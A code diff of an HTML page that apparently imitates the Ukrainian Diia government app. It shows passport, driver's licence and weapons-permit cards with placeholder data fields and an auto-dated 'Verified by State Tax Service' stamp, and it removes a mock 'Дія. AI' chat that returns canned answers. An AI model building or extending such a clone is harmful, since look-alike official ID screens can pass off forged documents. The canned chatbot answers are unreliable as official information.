@@ -26,10 +26,6 @@
           rel="shortcut icon" />
 
     <script src="assets/anime.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
-        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
-        crossorigin="anonymous"
-        referrerpolicy="no-referrer"></script>
     <link rel="stylesheet"
           href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
 
@@ -37,24 +33,10 @@
 
     <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script>
-    <script src="assets/jquery.marquee.min.js"
-        type="text/javascript"></script>
 
 </head>
 
 <style>
-   :root {
-    --ios-ease: cubic-bezier(0.32, 0.72, 0, 1);
-    --ios-spring: cubic-bezier(0.34, 1.56, 0.64, 1);
-}
-
-@media (prefers-reduced-motion: reduce) {
-    *, *::before, *::after {
-        animation-duration: 0.01ms !important;
-        transition-duration: 0.01ms !important;
-    }
-}
     @font-face {
         font-family: 'e-Ukraine';
         font-weight: 400;
@@ -74,23 +56,6 @@
         font-style: normal;
         font-display: swap;
     }
-    @font-face {
-        font-family: 'e-UkraineHead';
-        src: url('assets/e-UkraineHead-Medium.woff') format('woff');
-        font-weight: 500;
-        font-style: normal;
-        font-display: swap;
-    }
-
-    @font-face {
-        font-family: 'e-UkraineHead';
-        src: url('assets/e-UkraineHead-Bold.woff') format('woff');
-        font-weight: 700;
-        font-style: normal;
-        font-display: swap;
-    }
-
-
 
     /* Основний екран */
     .loadpage {
@@ -196,17 +161,11 @@
         width: 100%;
         overflow: hidden;
         background: linear-gradient(145deg, #b2d2e9 40%, #dbefd6 70%);
-        /*background: linear-gradient(145deg, #b2d2e9, #dbefd6, #b2d2e9, #dbefd6);*/
 
         display: flex;
         align-items: center;
         position: relative;
         justify-content: center;
-        /*background-size: 400% 400%;*/
-        /*animation: 15s linear 0s infinite alternate none running gradientAnimation*/
-        /*         background: linear-gradient(217deg, rgba(217, 51, 51, 0.8), rgba(255, 0, 0, 0) 50.71%), linear-gradient(127deg, rgba(57, 202, 57, 0.8), rgba(0, 255, 0, 0) 70.71%), linear-gradient(336deg, rgba(65, 65, 202, 0.8), rgba(0, 0, 255, 0) 70.71%);*/
-        /*         background-size: 150vw 150vh;*/
-        /*animation: 15s linear 0s infinite alternate none running granimate*/
     }
 
     @supports (-webkit-touch-callout: none) {
@@ -230,45 +189,41 @@
 
     @keyframes gradientAnimation {
         0% {
-            background: linear-gradient(145deg, #b2d2e9, #f1e3b2); /* бирюзово-желтый */
+            background: linear-gradient(145deg, #b2d2e9, #f1e3b2);
         }
 
         12.5% {
-            background: linear-gradient(145deg, #dbefd6, #d3b2f1); /* зеленовато-желтый и фиолетово-желтый */
+            background: linear-gradient(145deg, #dbefd6, #d3b2f1);
         }
 
         25% {
-            background: linear-gradient(145deg, #b2d2e9, #d3b2f1); /* бирюзово-фиолетовый */
+            background: linear-gradient(145deg, #b2d2e9, #d3b2f1);
         }
 
         37.5% {
-            background: linear-gradient(145deg, #f1e3b2, #dbefd6); /* желтовато-зеленый */
+            background: linear-gradient(145deg, #f1e3b2, #dbefd6);
         }
 
         50% {
-            background: linear-gradient(145deg, #b2d2e9, #f1e3b2); /* бирюзово-желтый */
+            background: linear-gradient(145deg, #b2d2e9, #f1e3b2);
         }
 
         62.5% {
-            background: linear-gradient(145deg, #dbefd6, #d3b2f1); /* зеленовато-желтый и фиолетово-желтый */
+            background: linear-gradient(145deg, #dbefd6, #d3b2f1);
         }
 
         75% {
-            background: linear-gradient(145deg, #b2d2e9, #d3b2f1); /* бирюзово-фиолетовый */
+            background: linear-gradient(145deg, #b2d2e9, #d3b2f1);
         }
 
         87.5% {
-            background: linear-gradient(145deg, #f1e3b2, #dbefd6); /* желтовато-зеленый */
+            background: linear-gradient(145deg, #f1e3b2, #dbefd6);
         }
 
         100% {
-            background: linear-gradient(145deg, #b2d2e9, #f1e3b2); /* бирюзово-желтый */
+            background: linear-gradient(145deg, #b2d2e9, #f1e3b2);
         }
     }
-
-
-
-
 
     .swiper-pagination {
         position: unset;
@@ -385,239 +340,28 @@
         bottom: 0;
         width: 100%;
         color: #fff;
-        background-color: #000;
-        padding: 10px 8px calc(10px + env(safe-area-inset-bottom, 0px));
+        background-color: black;
+        padding: 15px 20px;
         display: flex;
-        justify-content: space-around;
-        align-items: center;
-        gap: 0;
-        border-top: 1px solid rgba(255,255,255,0.08);
+        justify-content: space-between;
     }
 
-        .footer > div > span,
-        .footer > .nav-btn > span {
-            font-size: 10px;
-            letter-spacing: 0.01em;
+        .footer > div > span {
+            font-size: 12px;
         }
 
         .footer > div > img {
             filter: brightness(0) invert(1);
-            width: 24px;
-            height: 24px;
+            width: 25px;
+            height: 25px;
         }
 
-        .footer > div,
-        .footer > .nav-btn {
-            flex: 1;
+        .footer > div {
+            width: max-content;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 4px;
-            padding: 4px 2px;
-            cursor: pointer;
-            -webkit-tap-highlight-color: transparent;
-            user-select: none;
-        }
-
-        .footer > div.active > span,
-        .footer > div.active > img {
-            opacity: 1;
-        }
-        .footer > div:not(.active) > span,
-        .footer > div:not(.active) > img {
-            opacity: 0.55;
-        }
-
-        /* AI центральна кнопка */
-        .nav-btn--ai {
-            position: relative;
-        }
-        .nav-btn--ai .nav-svg {
-            width: 26px;
-            height: 26px;
-            filter: none;
-            drop-shadow: 0 0 8px rgba(255,255,255,0.4);
-        }
-        .nav-btn--ai span {
-            font-size: 10px;
-            color: #fff;
-            opacity: 1 !important;
-            background: linear-gradient(90deg, #a78bfa, #60a5fa);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            font-weight: 600;
-        }
-        .nav-btn--ai::before {
-            content: '';
-            position: absolute;
-            inset: -2px;
-            border-radius: 14px;
-            background: linear-gradient(135deg, rgba(167,139,250,0.15), rgba(96,165,250,0.15));
-            pointer-events: none;
-        }
-
-        /* AI Sheet overlay */
-        .ai-sheet-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.5);
-            z-index: 9000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s;
-            backdrop-filter: blur(4px);
-        }
-        .ai-sheet-overlay.open {
-            opacity: 1;
-            pointer-events: all;
-        }
-        .ai-sheet {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 9001;
-            background: #111;
-            border-radius: 24px 24px 0 0;
-            padding: 0 0 calc(20px + env(safe-area-inset-bottom, 0px));
-            transform: translateY(100%);
-            transition: transform 0.4s cubic-bezier(0.32, 0.72, 0, 1);
-            max-height: 85vh;
-            overflow-y: auto;
-        }
-        .ai-sheet.open {
-            transform: translateY(0);
-        }
-        .ai-sheet-handle {
-            width: 36px; height: 4px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 2px;
-            margin: 12px auto 0;
-        }
-        .ai-sheet-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 16px 20px 12px;
-            border-bottom: 1px solid rgba(255,255,255,0.08);
-        }
-        .ai-sheet-header h2 {
-            font-size: 18px;
-            font-weight: 700;
-            color: #fff;
-            flex: 1;
-        }
-        .ai-sheet-header .ai-badge {
-            font-size: 10px;
-            font-weight: 700;
-            background: linear-gradient(90deg, #a78bfa, #60a5fa);
-            color: #000;
-            padding: 3px 8px;
-            border-radius: 20px;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-        .ai-chat-area {
-            padding: 12px 16px;
-            min-height: 180px;
-            max-height: 300px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        .ai-msg {
-            max-width: 85%;
-            padding: 10px 14px;
-            border-radius: 18px;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        .ai-msg.bot {
-            background: rgba(255,255,255,0.08);
-            color: #fff;
-            align-self: flex-start;
-            border-bottom-left-radius: 4px;
-        }
-        .ai-msg.user {
-            background: linear-gradient(135deg, #a78bfa, #60a5fa);
-            color: #000;
-            align-self: flex-end;
-            border-bottom-right-radius: 4px;
-            font-weight: 600;
-        }
-        .ai-input-row {
-            display: flex;
-            gap: 10px;
-            padding: 12px 16px 0;
-        }
-        .ai-input {
-            flex: 1;
-            background: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.15);
-            border-radius: 24px;
-            color: #fff;
-            font-size: 14px;
-            font-family: 'e-Ukraine', sans-serif;
-            padding: 10px 16px;
-            outline: none;
-        }
-        .ai-input::placeholder { color: rgba(255,255,255,0.35); }
-        .ai-send-btn {
-            width: 44px; height: 44px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #a78bfa, #60a5fa);
-            border: none;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            flex-shrink: 0;
-        }
-        .ai-quick-chips {
-            display: flex;
-            gap: 8px;
-            padding: 10px 16px 0;
-            overflow-x: auto;
-            scrollbar-width: none;
-        }
-        .ai-quick-chips::-webkit-scrollbar { display: none; }
-        .ai-chip {
-            flex-shrink: 0;
-            background: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.15);
-            border-radius: 20px;
-            padding: 6px 14px;
-            font-size: 12px;
-            color: rgba(255,255,255,0.8);
-            cursor: pointer;
-            white-space: nowrap;
-            font-family: 'e-Ukraine', sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
-        .ai-chip:active { background: rgba(255,255,255,0.15); }
-        .ai-typing {
-            display: flex;
-            gap: 4px;
-            padding: 10px 14px;
-            background: rgba(255,255,255,0.08);
-            border-radius: 18px;
-            border-bottom-left-radius: 4px;
-            width: fit-content;
-        }
-        .ai-typing span {
-            width: 6px; height: 6px;
-            background: rgba(255,255,255,0.5);
-            border-radius: 50%;
-            animation: aiTyping 1.2s infinite;
-        }
-        .ai-typing span:nth-child(2) { animation-delay: 0.2s; }
-        .ai-typing span:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes aiTyping {
-            0%, 80%, 100% { transform: scale(0.7); opacity: 0.4; }
-            40% { transform: scale(1); opacity: 1; }
+            gap: 5px;
         }
 
     .main.active {
@@ -794,14 +538,11 @@
     .slider {
         width: 95%;
         transform-style: preserve-3d;
-        transition:none;
+        transition: transform 0.4s;
         position: relative;
         min-width: 0;
         height: 90%;
         margin-top: 20px
-    }
-    .slider.is-flipping {
-    pointer-events: none;
     }
 
     .front {
@@ -898,7 +639,7 @@
         left: 0;
         right: 0;
         padding: 10px 10px 10px 10px;
-        padding-top: env( safe-area-inset-top, 10px ); /* 10px fallback for older browsers */
+        padding-top: env( safe-area-inset-top, 10px );
         background-color: #66c67f;
         color: black;
         text-align: center;
@@ -927,7 +668,6 @@
     }
 
     @supports (padding-bottom: env(safe-area-inset-top)) {
-
 
         .footer {
             padding-bottom: calc(15px + env(safe-area-inset-bottom));
@@ -969,7 +709,6 @@
         height: 70px;
     }
 </style>
-
 
 <body data-scroll-lock-saved-overflow-y-property="hidden"
       data-scroll-lock-saved-inline-overflow-property=""
@@ -1229,8 +968,6 @@
         </div>
     </div>
 
-
-
     <div class="document_block_div zbroya_block_div">
         <div>
             <div class="main_block">
@@ -1243,6 +980,31 @@
                     <span>Оцінити документ</span>
                 </div>
                 <div class="border">
+                    <div class="document_block_div zbroya_block_div">
+                        <div>
+                            <div class="main_block">
+                                <div class="border">
+                                    <img src="assets/document.png" alt="" />
+                                    <span>Повна інформація</span>
+                                </div>
+                                <div class="border">
+                                    <img src="assets/star.png" alt="" />
+                                    <span>Оцінити документ</span>
+                                </div>
+                                <div class="border">
+                                    <img src="assets/exchange.png" alt="" />
+                                    <span>Змінити порядок документів</span>
+                                </div>
+                                <div>
+                                    <img src="assets/question.png" alt="" />
+                                    <span>Питання та відповіді</span>
+                                </div>
+                            </div>
+                            <div class="close_block" data-index="zbroya">
+                                Закрити
+                            </div>
+                        </div>
+                    </div>
                     <img src="assets/exchange.png" alt="" />
                     <span>Змінити порядок документів</span>
                 </div>
@@ -1268,7 +1030,6 @@
             z-index: -1;
             display: none;
         }
-
 
             .video-background.active {
                 display: block;
@@ -1303,7 +1064,6 @@
         </video>
     </div>
     <div id="notification" class="notification">Номер скопійовано</div>
-    <div id="overlay" class="overlay hidden"></div>
 
     <div class="start-div">
         <h1>Код для входу</h1>
@@ -1360,19 +1120,19 @@
                     </div>
                 </div>
                 <div class="threeButtons">
-                    <div class="threeButtons">
-                        <div class="quick-action" data-action="scan-qr">
+                    <div id="buttonLoad">
+                        <div>
                             <img src="assets/qr.svg" alt="" />
                         </div>
                         <span>Сканувати QR-код</span>
                     </div>
-                    <div class="quick-action" data-action="bonds">
+                    <div id="buttonLoad">
                         <div>
                             <img src="assets/gerb.png" alt="" />
                         </div>
                         <span>Військові облігації</span>
                     </div>
-                    <div class="quick-action" data-action="no-signal">
+                    <div id="buttonLoad">
                         <img style="
                                     width: 54px;
                                     height: 54px;
@@ -1426,7 +1186,6 @@
                                 font-weight: 300;
                                 font-size: 15px;
                             }
-
 
                     .news-main {
                         height: auto;
@@ -1577,7 +1336,6 @@
                 }
             </style>
 
-
             <style>
                 .modal {
                     position: fixed;
@@ -1632,9 +1390,6 @@
                 .open {
                     top: 5%;
                 }
-
-                /* Учитываем вырезы на экранах */
-
 
                 .fullPasportBlock {
                     background-color: #fff;
@@ -1769,6 +1524,7 @@
                     justify-content: center;
                     gap: 20px;
                 }
+            </style>
             <div id="study-modal" class="modal">
                 <div class="study-modal-content modal-content">
                     <div class="handle"></div>
@@ -1781,7 +1537,6 @@
                              alt="" />
                     </div>
 
-                    <!-- Вставьте сюда ваше содержимое -->
                     <div class="line1 marquee"
                          style="
                                 background: linear-gradient(
@@ -1913,9 +1668,9 @@
                     </div>
                 </div>
             </div>
-            </style>
-            <div id="zbroya-modal" class="modal">
-                <div class="zbroya-modal-content modal-content">
+
+            <div id="study-modal" class="modal">
+                <div class="study-modal-content modal-content">
                     <div class="handle"></div>
                     <h1>Дозвіл на зберігання і носіння зброї фізичною особою</h1>
 
@@ -1926,7 +1681,6 @@
                              alt="" />
                     </div>
 
-                    <!-- Вставьте сюда ваше содержимое -->
                     <div class="line1 marquee"
                          style="
                     background: linear-gradient(
@@ -2070,7 +1824,6 @@
                              alt="" />
                     </div>
 
-                    <!-- Вставьте сюда ваше содержимое -->
                     <div class="line2 marquee"
                          style="
                                 background: linear-gradient(
@@ -2194,11 +1947,11 @@
                                 <h3>
                                     Пройшов перевірку Державною податковую
                                     службою
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </h3>
                                 <span>
                                     Verifed by State Tax Service
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </span>
                             </div>
                         </div>
@@ -2297,7 +2050,6 @@
                     <div class="handle"></div>
                     <h1>єДокумент</h1>
 
-                    <!-- Вставьте сюда ваше содержимое -->
                     <div class="line2 marquee"
                          style="
                                 background: linear-gradient(
@@ -2408,7 +2160,6 @@
                              alt="" />
                     </div>
 
-                    <!-- Вставьте сюда ваше содержимое -->
                     <div class="line1 marquee"
                          style="
                                 background: linear-gradient(
@@ -2530,11 +2281,11 @@
                                 <h3>
                                     Пройшов перевірку Державною податковую
                                     службою
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </h3>
                                 <span>
                                     Verifed by State Tax Service
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </span>
                             </div>
                         </div>
@@ -2640,7 +2391,6 @@
                              alt="" />
                     </div>
 
-                    <!-- Вставьте сюда ваше содержимое -->
                     <div class="line1 marquee"
                          style="
                                 background: linear-gradient(
@@ -2762,11 +2512,11 @@
                                 <h3>
                                     Пройшов перевірку Державною податковую
                                     службою
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </h3>
                                 <span>
                                     Verifed by State Tax Service
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </span>
                             </div>
                         </div>
@@ -2869,7 +2619,6 @@
 
                 window.addEventListener('load', () => {
                     video.play().catch(() => {
-                        // Для PWA: якщо автозапуск заблоковано
                         document.body.addEventListener('click', () => {
                             video.play();
                         }, { once: true });
@@ -2913,7 +2662,6 @@
                         currentY = e.touches[0].clientY;
                         const diffY = currentY - startY;
 
-                        // Дозволяємо свайп вниз, якщо контент прокручений до самого верху
                         if (modalContent.scrollTop === 0 && diffY > 0) {
                             e.preventDefault();
                             modal.style.top = `calc(5% + ${diffY}px)`;
@@ -2928,13 +2676,11 @@
                         overlay.style.transition = 'opacity 0.3s';
 
                         if (currentY - startY > 200) {
-                            // Закриваємо модалку
                             modal.style.top = '100%';
                             modal.classList.remove('open');
                             overlay.classList.add('hidden');
                             overlay.style.opacity = '0';
                         } else {
-                            // Повертаємо на місце
                             modal.style.top = '5%';
                             overlay.style.opacity = '0.7';
                         }
@@ -2956,7 +2702,6 @@
                 const modalStudy = setupModal('study-modal', '.study-modal-content');
                 const modalPrava = setupModal('prava-modal', '.prava-modal-content');
                 const modaleDoc = setupModal('eDoc-modal', '.eDoc-modal-content');
-                const modalZbroya = setupModal('zbroya-modal', '.zbroya-modal-content');
 
                 // 4. ОБРОБНИКИ КЛІКІВ (ВІДКРИТТЯ)
                 const bindOpenModal = (selector, modalElement, blockClass) => {
@@ -2967,7 +2712,6 @@
                             overlay.classList.remove('hidden');
                             overlay.style.opacity = '0.7';
 
-                            // Очищення активних станів (якщо потрібно)
                             if (blockClass) {
                                 $(`.${blockClass}`).removeClass('active');
                                 $(`.${blockClass} > div`).removeClass('active');
@@ -2981,17 +2725,6 @@
                 bindOpenModal('#fullInfoStudy', modalStudy, 'study_block_div');
                 bindOpenModal('#fullInfoeDoc', modaleDoc, 'eDoc_block_div');
                 bindOpenModal('#fullInfoPrava', modalPrava, 'prava_block_div');
-                       
-                            if (overlay) {
-    overlay.addEventListener('click', () => {
-        document.querySelectorAll('.open').forEach(m => {
-            m.style.top = '100%';
-            m.classList.remove('open');
-        });
-        overlay.classList.add('hidden');
-        overlay.style.opacity = '0';
-    });
-}
 
             </script>
             <style>
@@ -3003,12 +2736,7 @@
                 .swiper-slide {
                     display: flex;
                     justify-content: center;
-                    perspective: 1200px;
-                    transition-timing-function: var(--ios-ease);
-                    will-change: transform;
                 }
-
-
             </style>
             <div class="documentSlider swiper-container">
                 <div class="swiper-wrapper" style="margin-bottom: 20px;">
@@ -3674,7 +3402,6 @@
                                             <span id="pravaNnumber">Тут твои данные</span>
                                         </div>
 
-
                                     </div>
                                 </div>
 
@@ -3952,8 +3679,8 @@
                         padding: 15px;
                         border-radius: 12px;
                         width: 100%;
-                        flex: 1 1 calc(50% - 10px); /* Учитывая зазор между элементами */
-                        margin: 5px; /* Зазор между элементами */
+                        flex: 1 1 calc(50% - 10px);
+                        margin: 5px;
                     }
 
                         .services > div > span {
@@ -3961,10 +3688,6 @@
                         }
 
                         .services > div > div {
-                            /* border-radius: 50%;
-                        padding: 5px;
-                        background: black;
-                        width: max-content; */
                             padding: 8px;
                             background-color: black;
                             width: max-content;
@@ -4228,171 +3951,15 @@
             <div data-index="2">
                 <img src="assets/docin.svg" alt="" /><span>Документи</span>
             </div>
-            <div class="nav-btn nav-btn--ai" role="button" tabindex="0" data-index="ai" onclick="openAiDiia()">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24.0 24.0" class="nav-svg"><g><path d="M2.747,21.253L3.808,20.192L3.808,20.192L2.747,21.253ZM2.747,2.747L1.686,1.687L1.683,1.69L2.747,2.747ZM21.253,2.747L20.192,3.808L20.192,3.808L21.253,2.747ZM21.253,21.253L20.192,20.192L20.192,20.192L21.253,21.253ZM12,23V21.5C8.905,21.5 7.086,21.418 5.88,21.191C4.782,20.983 4.291,20.675 3.808,20.192L2.747,21.253L1.686,22.313C2.639,23.266 3.694,23.831 5.324,24.139C6.846,24.426 8.935,24.5 12,24.5V23ZM2.747,21.253L3.808,20.192C3.32,19.704 3.012,19.213 2.806,18.118C2.58,16.913 2.5,15.096 2.5,12H1H-0.5C-0.5,15.063 -0.428,17.151 -0.142,18.672C0.164,20.302 0.731,21.358 1.687,22.313L2.747,21.253ZM1,12H2.5C2.5,8.905 2.582,7.088 2.809,5.884C3.016,4.787 3.325,4.294 3.811,3.805L2.747,2.747L1.683,1.69C0.734,2.644 0.169,3.698 -0.139,5.327C-0.426,6.848 -0.5,8.935 -0.5,12H1ZM2.747,2.747L3.808,3.808C4.291,3.325 4.782,3.017 5.88,2.809C7.086,2.582 8.905,2.5 12,2.5V1V-0.5C8.935,-0.5 6.846,-0.426 5.324,-0.139C3.694,0.169 2.639,0.734 1.686,1.687L2.747,2.747ZM12,1V2.5C15.095,2.5 16.914,2.582 18.12,2.809C19.218,3.017 19.709,3.325 20.192,3.808L21.253,2.747L22.313,1.687C21.361,0.734 20.306,0.169 18.676,-0.139C17.154,-0.426 15.065,-0.5 12,-0.5V1ZM21.253,2.747L20.192,3.808C20.68,4.296 20.988,4.787 21.194,5.882C21.42,7.087 21.5,8.904 21.5,12H23H24.5C24.5,8.937 24.428,6.849 24.142,5.328C23.836,3.698 23.269,2.642 22.313,1.687L21.253,2.747ZM23,12H21.5C21.5,15.096 21.42,16.913 21.194,18.118C20.988,19.213 20.68,19.704 20.192,20.192L21.253,21.253L22.313,22.313C23.269,21.358 23.836,20.302 24.142,18.672C24.428,17.151 24.5,15.063 24.5,12H23ZM21.253,21.253L20.192,20.192C19.709,20.675 19.218,20.983 18.12,21.191C16.914,21.418 15.095,21.5 12,21.5V23V24.5C15.065,24.5 17.154,24.426 18.676,24.139C20.306,23.831 21.361,23.266 22.313,22.313L21.253,21.253Z" fill="#ffffffff"></path></g><path d="M12,23C5.84,23 4.182,22.688 2.747,21.253C1.303,19.809 1,18.16 1,12C1,5.84 1.312,4.191 2.747,2.747C4.182,1.312 5.84,1 12,1C18.16,1 19.818,1.312 21.253,2.747C22.697,4.191 23,5.84 23,12C23,18.16 22.697,19.809 21.253,21.253C19.818,22.688 18.16,23 12,23Z" fill="transparent"></path><path d="M12,5L12.911,8.644C13.089,9.355 13.178,9.711 13.363,10C13.527,10.256 13.744,10.473 14,10.637C14.289,10.822 14.645,10.911 15.356,11.089L19,12L15.356,12.911C14.645,13.089 14.289,13.178 14,13.363C13.744,13.527 13.527,13.744 13.363,14C13.178,14.289 13.089,14.645 12.911,15.356L12,19L11.089,15.356C10.911,14.645 10.822,14.289 10.637,14C10.473,13.744 10.256,13.527 10,13.363C9.711,13.178 9.355,13.089 8.644,12.911L5,12L8.644,11.089C9.355,10.911 9.711,10.822 10,10.637C10.256,10.473 10.473,10.256 10.637,10C10.822,9.711 10.911,9.355 11.089,8.644L12,5Z" fill="#ffffffff"></path></svg>
-                <span>Дія. AI</span>
-            </div>
             <div data-index="3">
                 <img src="assets/circle.png" alt="" /><span>Сервіси</span>
             </div>
+
             <div data-index="4">
                 <img src="assets/user.png" alt="" /><span>Меню</span>
             </div>
         </div>
     </div>
-
-
-    <!-- ═══ ДІЯ AI SHEET ═══ -->
-    <div class="ai-sheet-overlay" id="aiOverlay" onclick="closeAiDiia()"></div>
-    <div class="ai-sheet" id="aiSheet">
-        <div class="ai-sheet-handle"></div>
-        <div class="ai-sheet-header">
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
-                <rect width="24" height="24" rx="8" fill="url(#aiGrad)"/>
-                <path d="M12,5L12.911,8.644C13.089,9.355 13.178,9.711 13.363,10C13.527,10.256 13.744,10.473 14,10.637C14.289,10.822 14.645,10.911 15.356,11.089L19,12L15.356,12.911C14.645,13.089 14.289,13.178 14,13.363C13.744,13.527 13.527,13.744 13.363,14C13.178,14.289 13.089,14.645 12.911,15.356L12,19L11.089,15.356C10.911,14.645 10.822,14.289 10.637,14C10.473,13.744 10.256,13.527 10,13.363C9.711,13.178 9.355,13.089 8.644,12.911L5,12L8.644,11.089C9.355,10.911 9.711,10.822 10,10.637C10.256,10.473 10.473,10.256 10.637,10C10.822,9.711 10.911,9.355 11.089,8.644L12,5Z" fill="white"/>
-                <defs><linearGradient id="aiGrad" x1="0" y1="0" x2="24" y2="24"><stop stop-color="#a78bfa"/><stop offset="1" stop-color="#60a5fa"/></linearGradient></defs>
-            </svg>
-            <h2>Дія. AI</h2>
-            <span class="ai-badge">Beta</span>
-        </div>
-        <div class="ai-chat-area" id="aiChatArea">
-            <div class="ai-msg bot">👋 Привіт! Я Дія. AI. Можу відповісти на питання про ваші документи, терміни дії, процедури або допомогти знайти потрібний сервіс.</div>
-        </div>
-        <div class="ai-quick-chips" id="aiChips">
-            <div class="ai-chip" onclick="aiQuick(this)">📋 Мої документи</div>
-            <div class="ai-chip" onclick="aiQuick(this)">⏰ Терміни дії паспорта</div>
-            <div class="ai-chip" onclick="aiQuick(this)">🚗 Водійські права</div>
-            <div class="ai-chip" onclick="aiQuick(this)">🌍 Закордонний паспорт</div>
-            <div class="ai-chip" onclick="aiQuick(this)">🎓 Диплом</div>
-            <div class="ai-chip" onclick="aiQuick(this)">📞 Підтримка</div>
-        </div>
-        <div class="ai-input-row">
-            <input class="ai-input" id="aiInput" type="text" placeholder="Напишіть питання..." maxlength="500" onkeydown="if(event.key==='Enter')sendAiMsg()"/>
-            <button class="ai-send-btn" onclick="sendAiMsg()">➤</button>
-        </div>
-    </div>
-
-    <script>
-    // ═══ ДІЯ AI ═══
-    var aiOpen = false;
-    var aiHistory = [];
-    var aiTypingEl = null;
-
-    function openAiDiia() {
-        aiOpen = true;
-        document.getElementById('aiOverlay').classList.add('open');
-        document.getElementById('aiSheet').classList.add('open');
-        setTimeout(function(){ document.getElementById('aiInput').focus(); }, 400);
-    }
-
-    function closeAiDiia() {
-        aiOpen = false;
-        document.getElementById('aiOverlay').classList.remove('open');
-        document.getElementById('aiSheet').classList.remove('open');
-        document.getElementById('aiInput').blur();
-    }
-
-    function aiQuick(el) {
-        document.getElementById('aiInput').value = el.textContent.replace(/^[\S]+\s/, '');
-        sendAiMsg();
-    }
-
-    function addAiMsg(text, role) {
-        var area = document.getElementById('aiChatArea');
-        var div = document.createElement('div');
-        div.className = 'ai-msg ' + role;
-        div.textContent = text;
-        area.appendChild(div);
-        area.scrollTop = area.scrollHeight;
-        return div;
-    }
-
-    function showAiTyping() {
-        var area = document.getElementById('aiChatArea');
-        var div = document.createElement('div');
-        div.className = 'ai-typing';
-        div.innerHTML = '<span></span><span></span><span></span>';
-        area.appendChild(div);
-        area.scrollTop = area.scrollHeight;
-        aiTypingEl = div;
-        return div;
-    }
-
-    function removeAiTyping() {
-        if (aiTypingEl && aiTypingEl.parentNode) {
-            aiTypingEl.parentNode.removeChild(aiTypingEl);
-            aiTypingEl = null;
-        }
-    }
-
-    var AI_RESPONSES = {
-        'паспорт': '📋 Паспорт громадянина України (ID-картка) видається терміном на 10 років (для осіб від 18 років). Для оформлення потрібні фото 3×4, довідка про реєстрацію та сплата держмита.',
-        'права': '🚗 Водійське посвідчення видається на 10 років. Для отримання вперше потрібно скласти теоретичний та практичний іспит у сервісному центрі МВС.',
-        'загран': '🌍 Закордонний паспорт оформлюється на 10 років (для дорослих). Термін виготовлення: стандартний — 20 робочих днів, прискорений — 7 робочих днів.',
-        'диплом': '🎓 Диплом про вищу освіту видається після завершення навчання. Дублікат можна замовити в університеті або через Дія.',
-        'підтримк': '📞 Служба підтримки Дія: 0800 700 500 (безкоштовно). Також доступний чат на сайті diia.gov.ua.',
-        'документи': '📋 У Дія доступні: паспорт, ID-картка, ІПН, водійські права, техпаспорт, закордонний паспорт, студентський квиток, диплом та інші документи.',
-        'термін': '⏰ Терміни дії документів: паспорт (ID) — 10 років, закордонний паспорт — 10 років (після 16 р), водійські права — 10 років.',
-    };
-
-    function getAiResponse(text) {
-        var lc = text.toLowerCase();
-        for (var key in AI_RESPONSES) {
-            if (lc.indexOf(key) !== -1) return AI_RESPONSES[key];
-        }
-        // Fallback responses
-        var fallbacks = [
-            '🤖 Дякую за питання! За детальною інформацією зверніться на diia.gov.ua або зателефонуйте на гарячу лінію 0800 700 500.',
-            '📋 Я поки не маю точної відповіді на це питання. Рекомендую перевірити розділ «Послуги» або звернутися до служби підтримки.',
-            '💡 Це питання краще уточнити у відповідному органі влади. Можу допомогти з іншим питанням?',
-            '🔍 Шукаю відповідь... За детальнішою інформацією зверніться в найближчий ЦНАПi або на сайт diia.gov.ua.'
-        ];
-        return fallbacks[Math.floor(Math.random() * fallbacks.length)];
-    }
-
-    function sendAiMsg() {
-        var input = document.getElementById('aiInput');
-        var text = (input.value || '').trim();
-        if (!text) return;
-        input.value = '';
-
-        addAiMsg(text, 'user');
-        aiHistory.push({ role: 'user', text: text });
-
-        var typing = showAiTyping();
-        var delay = 600 + Math.random() * 800;
-
-        setTimeout(function() {
-            removeAiTyping();
-            var resp = getAiResponse(text);
-            addAiMsg(resp, 'bot');
-            aiHistory.push({ role: 'bot', text: resp });
-        }, delay);
-    }
-
-    // Swipe down to close AI sheet
-    (function() {
-        var sheet = document.getElementById('aiSheet');
-        var startY = 0, isDragging = false;
-        sheet.addEventListener('touchstart', function(e) {
-            if (e.target.classList.contains('ai-input')) return;
-            startY = e.touches[0].clientY;
-            isDragging = true;
-        }, { passive: true });
-        sheet.addEventListener('touchmove', function(e) {
-            if (!isDragging) return;
-            var dy = e.touches[0].clientY - startY;
